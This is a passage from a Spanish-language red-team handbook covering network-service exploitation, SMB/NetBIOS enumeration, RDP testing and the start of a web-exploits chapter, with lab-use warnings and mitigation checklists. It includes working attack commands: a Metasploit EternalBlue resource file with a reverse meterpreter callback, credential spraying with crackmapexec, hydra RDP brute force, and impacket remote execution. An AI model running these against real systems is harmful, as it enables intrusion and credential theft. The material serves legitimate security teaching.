Esto detecta si una misma IP es anunciada por distintas MACs — señal de conflicto o posible spoofing.

---

## Detección de ICMP floods / anomalías (Python + tshark)

Ejemplo de conteo de ICMP por segundo:

```bash
tshark -i eth0 -Y icmp -T fields -e frame.time_epoch | awk '{print int($1)}' | uniq -c
```

O un script python que lee pcap y produce histogramas por segundo (útil para establecer baseline y detectar spikes).

---

## Inspección HTTPS controlada con mitmproxy

`mitmproxy` permite interceptar y ver tráfico TLS si los clientes confían en la CA de `mitmproxy` (caso: laboratorio).

Ejemplo mínimo (modo proxy HTTP(S)):

```bash
mitmproxy --mode regular --listen-port 8080 --set block_global=false --save-stream-file mitm_streams
```

* Instalación y generación de CA: `mitmproxy` crea una CA local. Importa su certificado en el navegador/VM cliente de laboratorio para permitir inspección.
* Script para exportar flows a JSON: `mitmdump -w flows.mitm --set flow_detail=3` o usar addons en Python para filtrar/extrarct.

Addon mínimo (`log_requests.py`) para mitmproxy:

```python
from mitmproxy import http
import json, time

def request(flow: http.HTTPFlow) -> None:
    entry = {
        "ts": int(time.time()),
        "client": flow.client_conn.peername,
        "host": flow.request.host,
        "method": flow.request.method,
        "path": flow.request.path
    }
    with open("mitm_requests.jsonl","a") as f:
        f.write(json.dumps(entry)+"\n")
```

Ejecutar: `mitmdump -s log_requests.py`

**Advertencia:** no uses `mitmproxy` en redes de terceros o con usuarios sin consentimiento; la inspección TLS sin consentimiento viola privacidad y leyes.

---

## Procesado de PCAP con Pyshark (post-proceso)

Ejemplo para contar puertos más frecuentes:

```python
import pyshark, collections, sys
cap = pyshark.FileCapture('capture.pcap', keep_packets=False)
cnt = collections.Counter()
for pkt in cap:
    try:
        if hasattr(pkt, 'tcp'):
            cnt[int(pkt.tcp.dstport)] += 1
        elif hasattr(pkt, 'udp'):
            cnt[int(pkt.udp.dstport)] += 1
    except Exception:
        pass
print(cnt.most_common(20))
```

Pyshark facilita extracción de campos por protocolo usando los disectores de tshark.

---

## Rotación de logs y automatización

Ejemplo simple en Bash para lanzar tcpdump con rotación y activar análisis periódico:

```bash
#!/usr/bin/env bash
OUTDIR=/var/log/redteam
mkdir -p "$OUTDIR"
# lanzar captura en background (ejecutar con systemd preferible)
sudo tcpdump -i eth0 -w "$OUTDIR/cap.pcap" -C 200 -W 24 -z /usr/bin/gzip &
# job de análisis cada 5 minutos (crontab) -> procesa el último pcap cerrado
# script analyze_last.sh (llamar desde cron)
```

El procesamiento puede invocar `tshark` o scripts Python para generar resúmenes y alertas.

---

## Mitigaciones y buenas prácticas defensivas

* Segmentación de red y uso de switches gestionados con port security para prevenir ARP spoofing.
* Habilitar DHCP snooping, Dynamic ARP Inspection en infraestructuras que lo soporten.
* Forzar uso de HTTPS y HSTS; desplegar certificados y minimizar exposición de datos en headers.
* Monitorizar tasas de ICMP/ARP y configurar alertas de SIEM/IDS.
* Usar IMDSv2 en cloud para evitar robo de credenciales por sniffing local.
* Mantener políticas de captura y retención de pcap que cumplan con privacidad y legislación.

---

## Checklist rápido

* [ ] Autorización y scope para captura.
* [ ] Interfaz y filtros definidos (BPF) antes de capturar.
* [ ] Snapshots / recuperación plan si la captura afectara rendimiento.
* [ ] Logs rotados y resguardados en repositorio seguro.
* [ ] Scripts de detección ARP/ICMP en modo pasivo y prueba de false positives.
* [ ] Mitigaciones implementadas y recomendaciones entregadas.

---

# Capítulo 16 — Explotación de servicios de red

**Herramientas:** `metasploit-framework`, `searchsploit`, `nc`, `impacket` (ej.: `psexec.py`, `wmiexec.py`), `python` (subprocess, paramiko, pwntools para laboratorio).
**Objetivos**

* Entender el papel de frameworks (Metasploit) frente a explotación manual y cuándo automatizar.
* Aprender a buscar exploits con `searchsploit` y a orquestar ejecuciones controladas con scripts y resource files.
* Conocer técnicas de explotación manual seguras en laboratorio (SMB, RDP, servicios HTTP) y cómo automatizar flujos de trabajo en Python sin causar daño.
* Incluir plantillas y ejemplos prácticos (Bash + Python) para discovery → selección de exploit → ejecución en entorno controlado y captura de evidencia.

> **AVISO ÉTICO-LEGAL (OBLIGATORIO).**
> Toda explotación descrita en este capítulo está destinada exclusivamente a entornos de laboratorio o sistemas donde exista autorización **escrita y documentada**. Ejecutar exploits contra sistemas de terceros sin permiso es ilegal y peligroso. Antes de cualquier explotación: snapshots, backups, contactos de emergencia, RoE claros y plan de rollback.

---

## Panorama: Metasploit vs Explotación manual

* **Metasploit:** framework completo con base de datos de exploits, payloads, módulos post-explotación (meterpreter), integración con listeners/C2. Excelente para pruebas rápidas y pipelines reproducibles.
* **Explotación manual:** cuando los exploits automatizados fallan o hay que adaptar payloads; permite mayor control y menor riesgo de efectos colaterales.
* **Automatización responsable:** usar resource scripts, msfrpc (si corresponde) o wrappers con `subprocess` para ejecutar tareas repetibles en laboratorio.

---

## Búsqueda de exploits con `searchsploit`

`searchsploit` (de Exploit-DB) permite buscar exploits/off-sets localmente en tu máquina Kali:

```bash
# Buscar por producto y versión
searchsploit "apache 2.4.49"
# Mostrar detalles y ruta del exploit
searchsploit -x 48988   # -x extrae preview del exploit (por id)
# Guardar resultados a CSV simple
searchsploit --nmap /path/scan.xml --shell -o search_results.txt
```

**Flujo práctico:** obtén la lista de servicios vulnerables (desde nmap), pásala por `searchsploit --nmap` para obtener candidatos, filtra por relevancia y prioridad, y crea resource files o scripts para pruebas en laboratorio.

---

## Metasploit: resource scripts y ejecución no interactiva

Un *resource file* (`script.rc`) automatiza comandos de `msfconsole`. Ejemplo de uso seguro en laboratorio:

```text
# script.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.5
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.10
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

Ejecución:

```bash
msfconsole -q -r script.rc
```

* `-j` lanza job en background; `-z` no interactúa con reverse shell.
* En laboratorio, configura `ExitOnSession false` y `WfsDelay`/`MaxAttempts` para no sobrecargar.
* Registra salidas con `spool` o redirige logs.

---

## Automatización: pipeline seguro (Bash + Python)

A continuación un pipeline controlado que: 1) toma un `nmap` XML, 2) corre `searchsploit --nmap` para obtener candidatos, 3) genera un `msf` resource file de prueba para revisarlo manualmente.

### 1) Bash: generar candidatos con searchsploit

```bash
#!/usr/bin/env bash
# gen_exploit_candidates.sh
NMAP_XML=${1:-scans/target.xml}
OUTDIR=${2:-./exploit_candidates}
mkdir -p "$OUTDIR"
echo "[*] Ejecutando searchsploit sobre $NMAP_XML"
searchsploit --nmap "$NMAP_XML" > "$OUTDIR/searchsploit_results.txt" || true
# Extraer líneas con path local a exploit (cuando existe)
grep -E '/exploitdb/' "$OUTDIR/searchsploit_results.txt" | awk -F' - ' '{print $2}' | sed 's/^[[:space:]]*//g' > "$OUTDIR/exploit_paths.txt" || true
echo "Candidates stored in $OUTDIR/exploit_paths.txt"
```

### 2) Python: generar resource file (revisión manual obligatoria)

```python
#!/usr/bin/env python3
# mk_msf_rc.py
import sys, os, csv
if len(sys.argv) < 4:
    print("Usage: mk_msf_rc.py hosts_file exploit_paths out.rc")
    sys.exit(1)
hosts_file, exploits_file, out_rc = sys.argv[1], sys.argv[2], sys.argv[3]
hosts = [l.strip() for l in open(hosts_file) if l.strip()]
exps = [l.strip() for l in open(exploits_file) if l.strip()]
with open(out_rc,'w') as fh:
    fh.write("setg VERBOSE true\n")
    for h in hosts:
        for e in exps:
            # WARNING: mapear exploit path a módulo msf si se sabe; aquí generamos una plantilla para revisión
            fh.write(f"# Candidate exploit for {h}: {e}\n")
            fh.write(f"# use exploit/???  # revisar manualmente el módulo correspondiente\n")
            fh.write(f"# set RHOSTS {h}\n\n")
print("Resource file generado:", out_rc)
```

Este enfoque fuerza la **revisión manual** antes de ejecutar cualquier exploit.

---

## Ejecución controlada y captura de evidencia

* Antes de ejecutar: crear snapshot; habilitar full logging (`msfconsole -L` o `spool`); notificar contacto de emergencia.
* Ejecutar exploits en modo `-z` y `-j` para no intervenir interactivamente; monitorizar jobs con `jobs` y `sessions -l`.
* Capturar outputs en `/var/log/redteam/` y en `c2` o almacenamiento seguro para el reporte.

---

## Explotación manual: ejemplos didácticos (laboratorio)

1. **SMB / autenticación débil:** si identificas credenciales válidas, usa `smbclient` o `smbexec` (impacket) para interactuar:

```bash
# probar con impacket wmiexec o smbclient (solo con autorización)
python3 /usr/share/doc/impacket/examples/wmiexec.py DOMAIN/USER:PASSWORD@10.0.0.5
```

2. **RDP:** enumerar versiones con `nmap --script rdp-enum-encryption` y, en laboratorio, usar `rdp-sec-check` o herramientas de explotación específicas si están en RoE.
3. **Servicios HTTP con RCE conocido:** validar PoC en VM de laboratorio, preferir técnicas no destructivas (ej.: `curl` con payloads que impriman entorno, no que borren datos).

**Nota:** nunca automatices credenciales descubiertas para autenticarse en sistemas reales sin permiso.

---

## Automatización en Python: invocar metasploit y capturar jobs

Ejemplo que lanza `msfconsole` con un resource file y monitoriza el proceso (capturando stdout/stderr) — uso en laboratorio y capturar logs.

```python
#!/usr/bin/env python3
import subprocess, shlex, time, os
rc = "lab_test.rc"
logdir = "logs"
os.makedirs(logdir, exist_ok=True)
with open(os.path.join(logdir,"msf_stdout.log"),"wb") as out, open(os.path.join(logdir,"msf_stderr.log"),"wb") as err:
    cmd = f"msfconsole -q -r {rc}"
    proc = subprocess.Popen(shlex.split(cmd), stdout=out, stderr=err)
    print("msfconsole started, pid", proc.pid)
    # Esperar un tiempo controlado (no bloquear indefinidamente)
    time.sleep(30)
    # enviar SIGINT para devolver control si es necesario
    proc.terminate()
    proc.wait(timeout=10)
    print("msf finished, returncode", proc.returncode)
```

Este script no interactúa con sesiones; solo ejecuta y registra salida. Para control más fino usar msfrpc (si está disponible) con autenticación rígida.

---

## Uso de `impacket` para post-explotación controlada

`impacket` contiene utilidades (e.g., `psexec.py`, `smbclient.py`) útiles para pruebas con credenciales en laboratorios:

```bash
# ejemplo (solo en entorno autorizado)
python3 /usr/share/doc/impacket/examples/psexec.py DOMAIN/user:pass@10.0.0.5 "ipconfig /all"
```

Documenta siempre la sesión y salida; evita ejecutar comandos destructivos.

---

## Manejo de fallos, seguridad y limitaciones

* Muchos exploits fallan o causan reinicios; siempre prueba en VM primero.
* No uses exploits que brinden persistencia irreversible sin acuerdo; documenta cualquier cambio y remediación necesaria.
* Automatiza con `--dry-run` o `--verify-only` cuando sea posible; añade `--max-retries` y timeouts en scripts.
* Mantén listas de exploits prohibidos por cliente (por impacto conocido).

---

## Recomendaciones de mitigación y detección

* Parches regulares y gestión de vulnerabilidades (Vulnerability Management).
* Restricción de servicios expuestos y aplicación de contraseñas fuertes / MFA.
* Monitoreo de intentos de explotación: alertas EDR/IDS para patrones de explotación (payload sizes, sequences).
* Firewalling y listas blancas para administración remota (SSH, RDP).
* Integración con CMDB para priorizar parches en activos críticos.

---

## Checklist previo a explotación

* [ ] Autorización escrita y RoE actualizada.
* [ ] Snapshots / backups completos.
* [ ] Contacto de emergencia definido y comunicado.
* [ ] Lista de exploits candidatos revisada manualmente.
* [ ] Logging y captura activa habilitados.
* [ ] Plan de rollback y limpieza definido.

---

# Capítulo 17 — Ataques SMB y NetBIOS

**Herramientas:** `smbclient`, `crackmapexec` (CME), `enum4linux`, `impacket` (smbclient, smbserver, secretsdump), `smbmap`.
**Objetivos**

* Comprender los vectores comunes relacionados con SMB/NetBIOS: recursos compartidos, permisos mal configurados, autenticación débil y exposición de servicios.
* Aprender a identificar recursos compartidos, listar contenidos y comprobar permisos (lectura/escritura) de forma segura en laboratorios autorizados.
* Automatizar la enumeración con scripts en **Bash** y **Python**, normalizar resultados y preparar evidencia para reportes.
* Incluir medidas de mitigación práctica y checklist operativo.

> **Advertencia ética-legal (obligatoria).**
> Todo lo mostrado en este capítulo debe usarse **solo** en entornos de laboratorio o contra sistemas para los que se dispone de autorización **escrita y documentada**. Acceder, modificar o explotar recursos de terceros sin permiso es delito y puede causar daños. Antes de ejecutar cualquier prueba: acuerdos, snapshots y plan de rollback.

---

## Panorama: por qué SMB/NetBIOS son críticos

SMB (Server Message Block) es un protocolo de compartición de archivos e impresoras muy utilizado en entornos Windows. Malas configuraciones comunes:

* Comparticiones anónimas o con permisos `Everyone: Full Control`.
* Credenciales reutilizadas o débiles.
* Versiones antiguas del protocolo (SMBv1) vulnerables.
* ACLs incorrectas que permiten subida de ejecutables o scripts.

Enumerar y verificar estos vectores en un laboratorio permite medir riesgo y recomendar mitigaciones.

---

## Herramientas y uso rápido

### enum4linux

Herramienta clásica para extraer información SMB/NetBIOS:

```bash
enum4linux -a 10.0.0.5
```

Salida: usuarios, shares, política de password, kernels, etc.

### smbclient (cliente SMB tipo ftp)

Conectar anónimo o con credenciales:

```bash
# Enumerar shares (anónimo)
smbclient -L //10.0.0.5 -N

# Con usuario
smbclient //10.0.0.5/Share -U "DOMAIN\\user" 
# luego comandos interactivos: ls, get, put, del
```

### smbmap

Mapea permisos de shares de forma automatizada:

```bash
smbmap -H 10.0.0.5 -u user -p 'Passw0rd!'
# muestra lista de shares y permisos (READ/WRITE)
```

### crackmapexec (CME)

Framework para enumeración y ataque en redes Windows (recon, ejecución remota, lateral movement facilitation).

```bash
# Enumerar hosts y servicios SMB en una red:
crackmapexec smb 10.0.0.0/24 --shares

# Intentar autenticación con lista de credenciales (en lab):
crackmapexec smb 10.0.0.0/24 -u users.txt -p passwords.txt --continue-on-success
```

CME imprime tablas fáciles de parsear; puede integrarse en pipelines.

### impacket

Contiene utilidades poderosas para SMB: `smbclient.py`, `smbexec.py`, `psexec.py`, `secretsdump.py`. Úsalas solo en laboratorios.

---

## Flujo de trabajo recomendado (seguro y reproducible)

1. **Confirmar scope y backups** (snapshots).
2. **Detección de hosts con SMB** (`nmap -p 445 --script smb-protocols,smb-os-discovery`).
3. **Enumeración pasiva/activo:** `enum4linux -a`, `smbclient -L`, `smbmap`.
4. **Verificación de accesos anónimos y permisos de escritura** (no subir archivos sin autorización).
5. **Recolección de artefactos** (listas, shares, ACLs) y almacenamiento en JSON/CSV.
6. **Si se detecta escritura autorizada y es parte del RoE:** probar subida de archivo de prueba inofensivo y posterior eliminación (documentar).
7. **Si se detectan credenciales válidas en scope:** documentar y coordinar rotación, no reutilizar para intrusión no autorizada.
8. **Reporte técnico** con evidencia, mitigaciones y priorización.

---

## Ejemplo práctico — Script Bash de enumeración ligera (`smb_enum.sh`)

Guarda como `smb_enum.sh`. Requiere `smbclient`, `smbmap`, `enum4linux`, `jq` para formateo.

```bash
#!/usr/bin/env bash
set -euo pipefail
TARGET=${1:-}
OUTDIR=${2:-./smb_out}
TS=$(date +%Y%m%d_%H%M%S)
mkdir -p "$OUTDIR"

if [ -z "$TARGET" ]; then
  echo "Uso: $0 <host> [outdir]"
  exit 1
fi

echo "[*] enum4linux -a $TARGET"
enum4linux -a "$TARGET" > "$OUTDIR/${TARGET}_enum4linux_${TS}.txt" || true

echo "[*] smbclient (list shares) - anonymous"
smbclient -L "//$TARGET" -N > "$OUTDIR/${TARGET}_shares_${TS}.txt" || true

echo "[*] smbmap (check perms) - anonymous"
if command -v smbmap >/dev/null 2>&1; then
  smbmap -H "$TARGET" > "$OUTDIR/${TARGET}_smbmap_${TS}.txt" || true
fi

echo "[*] nmap smb scripts (basic)"
nmap -p 445 --script smb-enum-shares.nse,smb-enum-users.nse -oN "$OUTDIR/${TARGET}_nmap_smb_${TS}.nmap" "$TARGET" || true

echo "Outputs in $OUTDIR"
```

**Notas:**

* `enum4linux` y `smbmap` ya dan mucha info estructurada; guarda salidas intactas para evidencia.
* No intentes `put` (subida) a shares sin autorización explícita; si el RoE lo permite, crea un archivo de prueba inofensivo y documenta.

---

## Ejemplo Python — parsear salidas y exportar CSV (`parse_smb_enum.py`)

Este script básico lee las salidas de `smbclient -L` y `smbmap` y genera CSV con shares y permisos.

```python
#!/usr/bin/env python3
import re, csv, sys, os, json

if len(sys.argv) < 3:
    print("Usage: parse_smb_enum.py <smbclient_output.txt> <smbmap_output.txt>")
    sys.exit(1)

smbclient_file = sys.argv[1]
smbmap_file = sys.argv[2]
out = "smb_shares_parsed.csv"

shares = []
# parse smbclient -L simple (buscar líneas con Disk)
with open(smbclient_file,encoding='utf-8',errors='ignore') as fh:
    for line in fh:
        m = re.match(r'^\s*([A-Za-z0-9_\-]+)\s+Disk', line)
        if m:
            shares.append({'share': m.group(1), 'perm':'unknown'})

# parse smbmap output (buscar permisos)
if os.path.exists(smbmap_file):
    with open(smbmap_file,encoding='utf-8',errors='ignore') as fh:
        for line in fh:
            # smbmap sample: \| SHARE \| PERMS \|
            parts = [p.strip() for p in line.split('|') if p.strip()]
            if len(parts)>=2 and parts[0] not in ('',):
                name = parts[0]
                perm = parts[1] if len(parts)>1 else ''
                # update existing
                updated=False
                for s in shares:
                    if s['share']==name:
                        s['perm']=perm
                        updated=True
                        break
                if not updated:
                    shares.append({'share':name,'perm':perm})

with open(out,'w',newline='',encoding='utf-8') as fh:
    w=csv.DictWriter(fh, fieldnames=['share','perm'])
    w.writeheader()
    for s in shares:
        w.writerow(s)
print("Exportado a", out)
```

---

## Ejemplo seguro: comprobación de escritura (solo si RoE lo permite)

Si la prueba autoriza verificar permisos de escritura, crear un archivo de prueba pequeño, subirlo y eliminarlo, documentando hash y timestamps.

Bash (ejemplo controlado):

```bash
echo "smb write test - $(date)" > test_write.txt
smbclient //10.0.0.5/Upload -U 'guest%' -c "put test_write.txt; ls; del test_write.txt"
```

*Solo ejecutar cuando esté explícitamente autorizado en el scope.*

---

## Automatización con CrackMapExec (ejemplo de uso en pipeline)

Enumerar shares en un rango y guardar salida JSON (CME tiene opciones de output que facilitan parseo):

```bash
crackmapexec smb 10.0.0.0/24 --shares --no-bruteforce --json > cme_shares.json
```

Luego usar scripts Python para leer `cme_shares.json` y extraer hosts con shares `WRITE` o `READ/WRITE`, priorizando por riesgo.

---

## Post-enumeración: extracción de secretos (solo en RoE)

Si la enumeración revela archivos potencialmente sensibles (p.ej. `config.php`, `.env`), **no** los descargues masivamente sin autorización. Procedimiento recomendado:

1. Documentar ruta y metadatos (nombre, tamaño, fecha).
2. Informar al responsable y coordinar extracción segura/forense.
3. Si se permite la descarga, hacerlo en entorno aislado y almacenarlo cifrado para análisis.

---

## Recomendaciones de mitigación

* Deshabilitar SMBv1 y forzar SMBv2+/SMB3.
* Restringir accesos a shares mediante ACLs (principio de mínimo privilegio) y no permitir `Everyone: Full Control`.
* Deshabilitar comparticiones anónimas y revisar la configuración de `Guest` y `NullSessionPipes`.
* Aplicar segmentación de red y firewalling (bloquear 445/137-139 desde fuera de la red interna).
* Escanear regularmente con scanners internos y aplicar detección de exfiltración vía SMB.
* Habilitar logging de acceso a shares y alertas por creación/modificación de ficheros críticos.

---

## Checklist operativo

* [ ] Alcance y autorización para pruebas SMB documentados.
* [ ] Snapshots antes de pruebas destructivas o subidas.
* [ ] Outputs sin alterar (raw) guardados para evidencia.
* [ ] No ejecutar `put`/`del` sin RoE; si está permitido, usar archivo de prueba inofensivo y registrar hash.
* [ ] Revisar y reportar permisos `WRITE` y `Everyone` en shares.
* [ ] Recomendar políticas de ACL y mitigaciones prioritarias.

---

# Capítulo 18 — Explotación de RDP y servicios Windows

**Herramientas:** `rdesktop`, `xfreerdp`, `nmap` (RDP NSE scripts), `rdpscan`/`rdp-sec-check` (auditoría), `rdpscan` (recon), `hydra` o `crowbar` *solo en laboratorio autorizado*, `impacket` (psexec, wmiexec) — y scripts de parseo en Python.

**Objetivos**

* Entender el protocolo RDP (puerto 3389), su arquitectura y los vectores de riesgo asociados (NLA, certificados, protocolos antiguos).
* Aprender a detectar, enumerar y clasificar servicios RDP expuestos de forma segura y reproducible.
* Conocer comandos y flags útiles para `xfreerdp` / `rdesktop` para pruebas interactivas en laboratorio.
* Revisar técnicas defensivas, limitaciones y cómo automatizar la recolección de evidencia y parsing de resultados (nmap XML → CSV/JSON).
* Reforzar la ética: **todas** las pruebas deben realizarse únicamente con autorización escrita y en entornos controlados.

> **Advertencia ética-legal (obligatoria).**
> Las técnicas aquí descritas son de uso legítimo para pruebas autorizadas y laboratorios. Exploits, fuerza bruta o bypass de autenticación contra sistemas de terceros sin permiso son actividades ilegales. Antes de ejecutar cualquier prueba: autorización por escrito, snapshots, RoE, plan de rollback y contacto de emergencia.

---

## Breve introducción al protocolo RDP y vectores de ataque

RDP (Remote Desktop Protocol) es el servicio de acceso gráfico remoto de Microsoft que opera normalmente en TCP/3389. Riesgos habituales:

* Hosts con RDP expuesto a Internet sin restricciones.
* Autenticación integrada (NLA — Network Level Authentication) ausente o mal configurada.
* Uso de versiones antiguas/protocolos inseguros (SMB/RDP de versiones antiguas con fallos).
* Credenciales débiles o reutilizadas (password spraying, brute force).
* Exposición de servicios auxiliares que facilitan movimiento lateral (SMB, WMI).

Objetivos del red team en esta área normalmente son: enumerar hosts RDP, evaluar si permiten conexiones sin NLA, comprobar presencia de cuentas vulnerables, y si está en scope, probar vectores seguros para acceder (p. ej. uso de credenciales válidas en laboratorio).

---

## Detección y enumeración segura (recomendado)

### 1) Detección rápida con nmap

Usar `nmap` con scripts NSE orientados a RDP para identificar servicio y características:

```bash
# Escaneo básico para encontrar hosts con puerto 3389 abierto
nmap -p 3389 --open -oA scans/rdp_hosts 10.0.0.0/24

# Escaneo con scripts RDP (obtener info de certificados, soportes de RDP, NLA)
nmap -sV -p 3389 --script rdp-enum-encryption,rdp-ntlm-info -oX scans/rdp_scan.xml 10.0.0.5
```

* `rdp-enum-encryption` informa sobre cifrados soportados y si NLA está presente.
* `rdp-ntlm-info` puede revelar información de registro del servicio (educativo).

Guarda siempre la salida en XML para post-procesado.

### 2) Herramientas específicas de hardening-check

* `rdp-sec-check` o `rdpscan` (si están disponibles) permiten auditar configuraciones de RDP (NLA obligatorio, cifrado, restricciones). Emplea estas herramientas en modo lectura y con bajos impactos.

---

## Conexiones interactivas con xfreerdp / rdesktop (laboratorio)

`xfreerdp` es moderno y recomendado frente a `rdesktop`. Ejemplos de uso seguro en laboratorio:

Conexión básica:

```bash
xfreerdp /v:10.0.0.5 /u:TESTUSER /p:'Password123' /cert-ignore
```

Flags útiles:

* `/cert-ignore` — ignorar warnings de certificado (solo en laboratorio).
* `/sec:tls` o `/sec:nla` — forzar mecanismo de seguridad.
* `/size:1366x768` — resolución de la sesión.
* `/sound:off` `/clipboard:off` — minimizar fugas de datos.
* `/log-level:TRACE` — cuando necesites logs detallados (guardar para evidencia).

`rdesktop` (legacy) conexión:

```bash
rdesktop -u TESTUSER -p Password123 -g 1366x768 10.0.0.5
```

No uses credenciales reales en ejemplos públicos. Siempre probar con cuentas de laboratorio.

---

## Pruebas de NLA y comprobaciones no intrusivas

* Comprobar si NLA está activo: si un cliente RDP rechaza la conexión antes del prompt de credenciales con un mensaje relacionado a NLA, eso indica que el host exige autenticación previa. `nmap` y `rdp-enum-encryption` también pueden indicar esto.
* Hosts sin NLA permiten un vector más directo para exploits históricos; documenta y prioriza estos hosts.

**Comprobación con xfreerdp sin enviar credenciales (solo probar handshake):**

```bash
xfreerdp /v:10.0.0.5 /cert-ignore /sec:tls /log-level:WARN +auth-only
```

`+auth-only` (si está disponible) intenta solo autenticación — si falla por falta de credenciales no envía comandos. Revisa la salida para ver si la negociación TLS y las capas se completan. (Ver manpage: flags pueden variar por versión).

---

## Fuerza bruta y password spraying — enfoque responsable

La fuerza bruta contra RDP es ruidosa y puede bloquear cuentas, generar alertas y causar impacto. En pruebas autorizadas:

* **Preferir password-spraying** en vez de brute-force: probar unas pocas contraseñas comunes contra muchas cuentas para evitar lockouts.
* Aplicar throttling y límites (ej.: 1 intento por cuenta por hora) y documentarlo.
* Registrar todo y coordinar con Blue Team.

Si en el scope está permitido usar `hydra` para pruebas con credenciales en laboratorio, un ejemplo de comando (educativo) sería:

```bash
hydra -L users.txt -P passwords.txt rdp://10.0.0.5 -t 4 -f
```

**Advertencia:** este comando realiza ataques de fuerza/credential stuffing. No lo ejecutes fuera de un laboratorio autorizado. Considera usar modos de prueba (`--dry-run`) o validadores que no envían intentos reales.

---

## Automatización segura: pipeline de detección → parseo → reporte

### 1) Escaneo nmap y extracción de hosts RDP (Bash)

```bash
#!/usr/bin/env bash
set -euo pipefail
NETWORK=${1:-10.0.0.0/24}
OUTDIR=${2:-./rdp_out}
mkdir -p "$OUTDIR"
nmap -p 3389 --open -oX "$OUTDIR/rdp_hosts.xml" "$NETWORK"
echo "Scan saved to $OUTDIR/rdp_hosts.xml"
```

### 2) Parser Python: extraer hosts RDP y metadatos (nmap XML → CSV)

`parse_rdp_nmap.py`

```python
#!/usr/bin/env python3
import sys, xml.etree.ElementTree as ET, csv, os, time

if len(sys.argv)<2:
    print("Usage: parse_rdp_nmap.py scan.xml")
    sys.exit(1)
infile=sys.argv[1]
out=os.path.splitext(infile)[0] + "_rdp_hosts.csv"
tree=ET.parse(infile)
root=tree.getroot()
rows=[]
for host in root.findall('host'):
    addr = host.find('address')
    ip = addr.get('addr') if addr is not None else ''
    ports = host.findall('ports/port')
    for p in ports:
        if p.get('portid') == '3389':
            svc = p.find('service')
            product = svc.get('product') if svc is not None else ''
            version = svc.get('version') if svc is not None else ''
            rows.append({'ip':ip,'port':3389,'product':product,'version':version})
with open(out,'w',newline='',encoding='utf-8') as fh:
    w=csv.DictWriter(fh, fieldnames=['ip','port','product','version'])
    w.writeheader()
    w.writerows(rows)
print("CSV written to", out)
```

Este CSV alimenta dashboards o listas de prioridad.

---

## Ejemplo: comprobación de shadowing/bluekeep-like (solo detección, no exploit)

Para vulnerabilidades críticas ya publicadas (ej. BlueKeep CVE histórico) **no** publiques ni ejecutes exploits. En laboratorio, usa detectores de firma (scripts nmap o scanners con DB CVE) que solo identifiquen huellas conocidas sin explotar. Por ejemplo:

```bash
nmap -sV --script rdp-vuln-ms12-020,rdp-vuln-ms12-xxx -p 3389 -oN scans/rdp_vuln_check 10.0.0.5
```

(Usa solo scripts de detección que no hagan explotación activa.) Siempre prioriza la verificación manual seguida de pruebas en VMs antes de intentar PoC.

---

## Post-explotación y movimiento lateral (recordatorio ético)

Si la RoE permite la escalada o el uso de credenciales, usa métodos controlados y documentados (ej.: `impacket`'s `wmiexec.py` o `psexec.py`) en máquinas laboratorio. No automatices la propagación: toda acción debe registrarse y tener una razón con permiso.

Ejemplo de uso de `wmiexec.py` (impacket) para ejecutar comando remoto con credenciales válidas — **solo en laboratorio**:

```bash
python3 /usr/share/doc/impacket/examples/wmiexec.py ADMIN:Passw0rd@10.0.0.5 "whoami"
```

Registra salida y guarda logs.

---

## Parsing de logs y resultados (Python): ejemplo de normalizador de intentos

Script que normaliza resultados de intentos (por ejemplo, salidas de herramientas, logs de RDP broker, msf) y produce resumen de KPIs (hosts encontrados, NLA present, posibles fallos):

`rdp_results_aggregator.py`

```python
#!/usr/bin/env python3
import csv, json, sys, os
# Input: CSV from parse_rdp_nmap.py and optional jsonl of scanner outputs
if len(sys.argv)<2:
    print("Usage: rdp_results_aggregator.py rdp_hosts.csv")
    sys.exit(1)
csvin=sys.argv[1]
out='rdp_summary.json'
summary={'total_hosts':0,'nla_required':0,'hosts':[]}
with open(csvin, newline='', encoding='utf-8') as fh:
    reader=csv.DictReader(fh)
    for row in reader:
        host={'ip': row['ip'], 'port': row['port'], 'product': row['product'], 'version': row['version'], 'nla_required': False}
        # heuristic: if product or version indicates NLA or TLS only, mark nla_required True (manual review)
        if 'nla' in (row.get('product') or '').lower() or 'rdp' in (row.get('product') or '').lower():
            host['nla_required']=False  # leave false unless explicit evidence
        summary['hosts'].append(host)
summary['total_hosts']=len(summary['hosts'])
with open(out,'w',encoding='utf-8') as fh:
    json.dump(summary, fh, indent=2)
print("Summary written to", out)
```

Este script es una base: en una campaña real alimentarás `nla_required` desde `nmap` script outputs o from `rdp-sec-check`.

---

## Detección y mitigación recomendadas (defensiva)

* Forzar NLA en todos los hosts RDP públicos y aplicar MFA para accesos remotos.
* Restringir el acceso a RDP mediante VPNs o jump hosts (bastion hosts) y listas blancas de IP.
* Bloquear RDP en el perímetro y permitir sólo desde redes de gestión o conexiones MFA.
* Monitorizar eventos de autenticación (Windows Event IDs: 4625/4624) y correlacionar con alertas de SIEM para detectar password spraying.
* Implementar account lockout policies con thresholds razonables y notificaciones.
* Mantener RDP y Windows actualizados contra CVEs conocidos; usar EDR para detección de post-exploitación.
* Evitar exponer RDP directamente a Internet; usar soluciones de broker de acceso remoto seguras.

---

## Checklist previo a pruebas RDP

* [ ] Permiso escrito y RoE con ventanas y límites de intensidad.
* [ ] Snapshots de los hosts objetivo.
* [ ] Contactos de emergencia y plan de rollback.
* [ ] Herramientas configuradas en entorno aislado.
* [ ] Registro y almacenamiento seguro de logs y evidencias.
* [ ] Validación manual antes de cualquier intento de fuerza bruta o explotación.

---

# Capítulo 19 — Exploits en servicios web

**Herramientas:** Burp Suite (Community/Pro), `sqlmap`, `commix`, `ffuf`, `wfuzz`, `curl`, `httpx`, `jq`, `python` (requests).
**Objetivos**

* Entender las vulnerabilidades web más comunes (SQLi, XSS, RCE, LFI, SSRF, Command Injection) y cómo priorizarlas en una campaña de red team.
* Conocer los flujos de trabajo seguros y reproducibles para descubrir, validar y documentar vulnerabilidades usando Burp Suite y herramientas automatizadas (`sqlmap`, `commix`) **en entornos autorizados**.
* Proveer plantillas y scripts para integrar descubrimiento → verificación segura → captura de evidencia → remediación.
* Mostrar ejemplos de payloads de prueba **sencillos** pensados para entornos de laboratorio y siempre evitar cualquier instrucción que pueda emplearse para dañar sistemas sin permiso.

> **AvisO ÉTICO Y LEGAL (OBLIGATORIO).**
